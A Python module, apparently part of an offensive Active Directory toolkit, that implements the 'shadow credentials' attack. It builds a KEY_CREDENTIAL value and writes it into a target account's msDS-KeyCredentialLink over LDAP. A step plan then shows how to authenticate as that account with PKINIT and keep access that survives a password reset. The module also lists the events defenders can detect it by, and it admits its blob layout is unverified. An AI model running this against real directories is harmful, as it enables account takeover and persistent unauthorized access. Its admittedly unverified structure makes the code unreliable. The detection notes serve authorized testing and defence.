# ============================================================================
"""Shadow credentials: a key credential written into the target's own directory object.

`msDS-KeyCredentialLink` is the attribute that lets an account authenticate with a public key
instead of a password - it is what Windows Hello for Business uses. A principal with write access
to that attribute can add a credential it owns the private half of, and from then on it
authenticates as the target with PKINIT: no password, no password reset that matters, and the
change is one attribute value.

This module does the two halves a session-based tool can do:
  * build the `B:<hex>` value (the KEY_CREDENTIAL structure)
  * write it through the LDAP client this tool already has (`core.ldap.LdapClient.modify`)

And it is explicit about the third half: USING it needs PKINIT (`core.pkinit`), because the
credential is a public key.

The layout of KEY_CREDENTIAL is versioned, and the field order below is the v2 form. It is
marked VERIFY against the AD documentation before a real run: a wrong field order produces a
blob the DC silently ignores, and "silently ignored" is the failure mode that wastes an
engagement.
"""
import binascii
import struct
import time
import uuid

__all__ = ["ShadowError", "key_credential", "add", "remove", "list_for", "plan", "describe",
           "KEY_USAGE", "LAYOUT_VERIFIED"]

# Key usage values (the NGC key usage enum).
KEY_USAGE = {"ngc": 0x01, "fido": 0x02, "u2f": 0x07, "pin": 0x08}

# The field order implemented below is the v2 KEY_CREDENTIAL layout. Set to False until the
# operator confirms it against the AD documentation for the target's schema version - the module
# reports this rather than pretending.
LAYOUT_VERIFIED = False


class ShadowError(RuntimeError):
    """A refusal the CLI can report verbatim."""


def key_credential(public_key=b"", device_id="", key_usage="ngc", key_source=1,
                   custom_flags=0, created=None, version=0x00000200):
    """The `B:<hex>` value for `msDS-KeyCredentialLink`.

    `public_key` is the DER of an RSA public key (or the raw key material), and the structure
    carries a SHA-256 of it, the device id, the usage and a creation time.
    """
    if not public_key:
        raise ShadowError("a key credential needs the public key material")
    import hashlib
    device = device_id or str(uuid.uuid4())
    try:
        device_bytes = uuid.UUID(str(device)).bytes_le
    except ValueError:
        device_bytes = hashlib.sha256(str(device).encode()).digest()[:16]
    material = bytes(public_key)
    digest = hashlib.sha256(material).digest()
    created_ticks = int((created or time.time()) * 10_000_000) + 116444736000000000
    # v2 KEY_CREDENTIAL: version, flags, key material length + material, key usage, key source,
    # device id, custom key information, key approval (the last two are optional and empty here)
    body = struct.pack("<HH", version & 0xFFFF, custom_flags & 0xFFFF)
    body += struct.pack("<I", len(material)) + material
    body += struct.pack("<I", KEY_USAGE.get(key_usage, 0x01))
    body += struct.pack("<I", int(key_source))
    body += device_bytes
    body += struct.pack("<Q", created_ticks)
    body += struct.pack("<I", len(digest)) + digest
    return "B:" + binascii.hexlify(body).decode()


def add(client, dn, credential, timeout=15):
    """Write the credential onto a directory object (one attribute value, one call)."""
    if not credential or not str(credential).startswith("B:"):
        raise ShadowError("a key credential value starts with 'B:'")
    return client.modify(dn, {"msDS-KeyCredentialLink": [credential]}, operation=0)


def remove(client, dn, credential):
    """Take it back off (the clean-up path: the attribute value, not the whole attribute)."""
    return client.modify(dn, {"msDS-KeyCredentialLink": [credential]}, operation=1)


def list_for(client, dn, attrs=None):
    """What the object already carries (a credential you did not add is someone else's)."""
    rows = client.search(base=dn, scope=0, filter_text="(objectClass=*)",
                         attrs=attrs or ["msDS-KeyCredentialLink", "sAMAccountName"])
    return (rows[0]["attrs"].get("msDS-KeyCredentialLink") or []) if rows else []


def plan(target="", key_usage="ngc"):
    return {
        "target": target, "key_usage": key_usage, "layout_verified": LAYOUT_VERIFIED,
        "what": ("write a key credential you own into the target's "
                 "msDS-KeyCredentialLink, then authenticate with PKINIT as that account - no "
                 "password, and a password reset does not remove it"),
        "steps": [
            {"step": 1, "what": "generate a key pair (or reuse one) and keep the private half"},
            {"step": 2, "what": "build the B:<hex> value (this module's key_credential)"},
            {"step": 3, "what": "add it to the target's msDS-KeyCredentialLink (needs write "
                                "access to that attribute on that object)"},
            {"step": 4, "what": "authenticate with PKINIT using the matching certificate "
                                "(core.pkinit) - the DC issues a TGT for the target"},
            {"step": 5, "what": "use the TGT, and remove the credential afterwards if the "
                                "engagement requires clean-up (remove)"},
        ],
        "needs": [
            "write access to msDS-KeyCredentialLink on the target object (GenericWrite, or "
            "owner, or a delegated ACE - this is the whole precondition)",
            "an LDAP client (core.ldap) and a key pair",
            "PKINIT (core.pkinit) to actually use the credential",
        ],
        "visible": [
            "an attribute change on the object: event 5136 with the attribute name, which is "
            "the detection every AD monitoring product has",
            "the PKINIT logon appears as a certificate logon (4768 with preauth type 16) for an "
            "account that has no smartcard",
            "a key credential whose device id belongs to no enrolled device",
        ],
        "limits": [
            "the KEY_CREDENTIAL field order is versioned: LAYOUT_VERIFIED is False until the "
            "operator confirms it against the AD documentation, because a wrong layout is "
            "silently ignored by the DC",
            "a strong-certificate-binding policy can require the credential to be usable only "
            "with the SID extension",
            "the private key must be protected: whoever holds it can authenticate as the target",
        ],
    }


def describe(facts):
    if "credential" in (facts or {}):
        return (f"shadow credential: {len(facts['credential'])} chars, device "
                f"{facts.get('device_id', '?')}")
    lines = [f"shadow credentials plan ({facts.get('target') or 'no target'}) "
             f"[layout verified: {facts.get('layout_verified')}]"]
    for step in facts.get("steps") or []:
        lines.append(f"  {step['step']}. {step['what']}")
    for item in facts.get("limits") or []:
        lines.append(f"  limit: {item}")
    return "\n".join(lines)
